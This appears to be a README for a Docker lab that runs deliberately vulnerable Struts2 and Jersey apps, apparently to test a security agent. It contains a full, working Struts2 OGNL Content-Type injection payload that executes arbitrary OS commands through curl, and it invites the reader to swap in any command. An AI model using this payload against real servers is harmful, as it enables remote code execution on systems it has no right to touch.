
**setup**

0.  install docker and docker-compose
1.  untar your agent distribution to the tcell/ directory
2.  copy your tcell_agent.config file to the tcell/ directory


**For the Struts2 Command Injection exploit:**

1.  launch with `docker-compose up struts2-exploit` from this directory.
2.  inject a command with the following `curl` statement.
```bash
curl http://127.0.0.1:8081/struts2-showcase-2.3.12/showcase.action  -H "Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo OWNED').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```
**Note**  change `echo OWNED` in the above statement to any command you want.


**For the Jersey Command Injection app:**

1.  launch with `docker-compose up jersey-injection` from this directory
2.  open `http://localhost:8080/jersey/` in your browser.
